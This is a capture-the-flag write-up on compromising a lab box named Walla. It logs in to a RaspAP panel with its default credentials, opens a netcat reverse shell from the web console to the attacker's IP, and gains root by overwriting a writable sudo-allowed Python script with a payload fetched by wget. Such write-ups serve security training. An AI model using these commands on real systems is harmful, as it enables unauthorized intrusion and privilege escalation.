#Linux #DefaultCreds #RaspAP #WebConsole #sudo #PythonHijack #FileWrite

## Overview

Walla is a Linux box running RaspAP, a web-based Wi-Fi management interface, protected by HTTP Basic Auth with vendor-default credentials. The application's built-in system console provides a shell escape as `www-data`. Privilege escalation abuses a sudo rule that lets `www-data` run a specific Python script, but the script file is writable, so replacing it with a one-liner spawns a root shell.

## Recon

### Port Scan

```sh
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian
23/tcp    open  telnet  Linux telnetd
25/tcp    open  smtp    Postfix smtpd
53/tcp    open  domain
422/tcp   open  ssh     OpenSSH 7.9p1 Debian
8091/tcp  open  http    lighttpd 1.4.53  (HTTP Basic Auth: RaspAP)
42042/tcp open  ssh     OpenSSH 7.9p1 Debian
```

SSH is available on three ports (22, 422, 42042). Port 8091 serves an HTTP Basic Auth challenge identifying the realm as **RaspAP**.

## Foothold

### Default Credentials on RaspAP

The RaspAP documentation publishes the default credentials:

```
admin:secret
```

Those credentials worked against the Basic Auth prompt on port 8091, granting access to the RaspAP v2.5 management panel. A CVE exists for this version (CVE-2020-24572 RCE) but did not work against this box.

> **Why checking the docs beats running exploits first:** appliance-style software ships with documented defaults so the installer can log in on first boot. A significant percentage of real deployments never change these. The check takes one HTTP request; an exploit takes minutes to set up and may fail on patched or differently-configured instances.

The RaspAP panel includes a **System > Console** page, a browser-based terminal running as `www-data`. Netcat with `-e` was available, so I used it to escape to a listener:

```sh
# in the web console
nc 192.168.45.244 443 -e /bin/bash
```

```sh
rlwrap nc -lvnp 443
connect to [192.168.45.244] from (UNKNOWN) [192.168.183.97] 35628
whoami
www-data
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@walla:/var/www/html/includes$
```

## Privilege Escalation

### Writable Python Script in sudo Rules

`sudo -l` output:

```
User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
```

The rule pins the interpreter (`/usr/bin/python`) and the script path (`/home/walter/wifi_reset.py`), which looks secure. The file itself, however, was writable by `www-data`:

```sh
www-data@walla:/home/walter$ rm wifi_reset.py
rm: remove write-protected regular file 'wifi_reset.py'? y
```

> **Why pinning the script path isn't enough:** sudo validates whether the command matches the allow-list, not whether the script's contents are safe. If the script file is writable by the calling user, the attacker controls what runs under sudo, the path restriction becomes meaningless. This is a common misconfiguration when admins grant sudo for a management script but leave it in a user's home directory.

I replaced the file with a minimal Python payload:

```python
import os
os.system('/bin/bash')
```

Served it over HTTP from Kali and downloaded it on target:

```sh
python3 -m http.server 80
wget http://192.168.45.244/wifi_reset.py
```

Then ran it via the sudo rule:

```sh
www-data@walla:/home/walter$ sudo /usr/bin/python /home/walter/wifi_reset.py
root@walla:/home/walter# whoami
root
```

## Root

```sh
root@walla:~# cat proof.txt
‹redacted›
```

## Takeaways

- **Default credentials are always step one on appliance-style web apps.** `admin:secret` on RaspAP is in the public documentation.
- **Built-in web consoles are shells.** RaspAP's System Console ran as `www-data` and supported `nc -e`, the web interface was the foothold.
- **sudo allow-lists that specify a script path still escalate if the script is writable.** The file's permissions matter as much as the sudo rule's content.
